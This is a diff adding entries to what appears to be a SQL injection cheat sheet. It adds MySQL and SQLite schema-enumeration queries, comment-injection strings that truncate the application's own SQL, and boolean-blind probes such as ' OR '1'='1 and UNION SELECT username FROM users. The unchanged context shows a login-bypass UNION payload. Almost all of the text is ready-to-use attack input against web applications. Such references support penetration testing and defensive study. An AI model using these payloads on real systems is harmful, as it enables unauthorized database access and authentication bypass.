@@ -419,8 +419,10 @@ Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targe
 /* MySQL (db.information_schema) */
   SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
   SELECT * FROM INFORMATION_SCHEMA.TABLES;
+  SELECT table_name, table_type, engine FROM information_schema.tables;
   
 /* Sqlite (db.sqlite_master) */
+  SELECT sql FROM sqlite_master;
   SELECT name FROM sqlite_master WHERE type='table';  -- Step #1: Access table names from 'sqlite_master' table.
   SELECT * FROM table_name LIMIT 1;                   -- Step #2: Enumerate column names from the specified table.
 ```
@@ -448,6 +450,16 @@ Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targe
   ' UNION SELECT 1, 'admin', 'doesnt matter', 1--
 ```
 
+**Comment Injection (bypass appended sql)**
+```sql
+[SOURCE CODE QUERY: SELECT * FROM users WHERE name='?' LIMIT 1;]
+Bypass 'LIMIT 1;' with:
+x' --
+x' #
+x' //
+x' /*
+```
+
 **Blind SQLi (Boolean / Time-based)**
 ```sql
 /* General */
@@ -458,6 +470,14 @@ page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
 page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
+
+/* Probes: existence of databases, values */
+' OR '1'='1
+' UNION SELECT 1 FROM users'
+' UNION SELECT username FROM users WHERE username LIKE '%
+SELECT * FROM users WHERE username='' OR '1'='1'
+SELECT * FROM users WHERE username='' UNION SELECT 1 FROM users
+SELECT * FROM users WHERE username='' UNION SELECT username FROM users WHERE username LIKE '%'
 
 /* Enumerate username string */
 -- Note: USER() is a MySQL function to return the current user and hostname as a string.
